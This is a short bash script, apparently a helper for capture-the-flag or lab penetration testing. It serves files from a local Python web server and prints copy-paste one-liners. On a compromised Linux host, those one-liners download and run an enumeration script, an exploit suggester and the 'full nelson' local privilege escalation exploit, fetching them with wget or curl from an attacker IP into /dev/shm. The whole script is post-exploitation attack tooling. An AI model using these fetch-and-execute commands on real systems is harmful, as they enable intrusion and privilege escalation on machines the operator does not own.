#!/bin/bash

echo "serving enumeration scripts..."
python -m SimpleHTTPServer 8123 &
filename="linux-local-enum.sh"
echo "local enumeration - copy & paste one of commands below..."
echo "cd /dev/shm && wget http://10.10.16.10:8123/${filename} && chmod +x ${filename} && ./${filename}"
echo "cd /dev/shm && curl http://10.10.16.10:8123/${filename} && chmod +x ${filename} && ./${filename}"

filename="linux-exploit-suggester.pl"
echo "exploit suggester - copy & paste one of commands below..."
echo "cd /dev/shm && wget http://10.10.16.10:8123/${filename} && chmod +x ${filename} && ./${filename}"
echo "cd /dev/shm && curl http://10.10.16.10:8123/${filename} && chmod +x ${filename} && ./${filename}"

filename="full-nelson.c"
echo "full nelson - local privilege escalation"
echo "cd /dev/shm && wget http://10.10.16.10:8123/${filename} && chmod +x ${filename} && ./${filename}"
echo "cd /dev/shm && curl http://10.10.16.10:8123/${filename} && gcc ${filename} -o ${filename}.out && chmod +x ${filename}.out && ./${filename}.out"
echo "closing in 60 seconds..."
sleep 60
ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill
